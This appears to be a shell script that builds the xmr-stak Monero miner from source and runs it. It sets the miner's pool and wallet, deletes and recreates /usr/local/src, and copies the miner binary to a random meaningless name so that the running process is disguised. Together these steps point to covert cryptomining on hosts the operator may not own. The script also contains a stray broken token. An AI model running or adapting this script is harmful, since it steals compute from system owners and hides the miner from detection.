#!/bin/bash
sudo apt-get update -y && 
sudo apt-get install cpulimit &&
sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev &&
mkdir /usr/local
mkdir /usr/local/src
rm -r /usr/local/src
mkdir /usr/local/src
git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src
mkdir build
cd build 
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
make install
cd bin/ &&
sudo sysctl -w vm.nr_hugepages=2 &&
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
"cpu_threads_conf" :
[
    { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : 0 },
    { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : 1 },
    { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : 2 },
    { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : 3 },
], 
"call_timeout" : 10,
"retry_time" : 30,
"giveup_limit" : 0,
"verbose_level" : 3,
"print_motd" : true,
"h_print_time" : 60,
"aes_override" : null,
"use_slow_memory" : "warn",
"tls_secure_algo" : true,
"daemon_mode" : false,
"flush_stdout" : false,
"output_file" : "",
"httpd_port" : 99,
"http_login" : "",
"http_pass" : "",
"prefer_ipv4" : true,
EOT
' &&
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
"pool_list": [
	{
		"pool_address": "us-east.cryptonight-hub.miningpoolhub.com:20580",
		"wallet_address": "Luanbuifx.1",
		"rig_id": "x",
		"pool_password": "x",
		"use_nicehash": false,
		"use_tls": false, /* Set to true if you are using an SSL port */
		"tls_fingerprint": "",
		"pool_weight": 1
	},
],
"currency": "cryptonight_r",
EOT
' &&a
sudo cp xmr-stak "$cpuname"
rm xmr-stak
echo $cpuname" is starting"
./"${cpuname}"


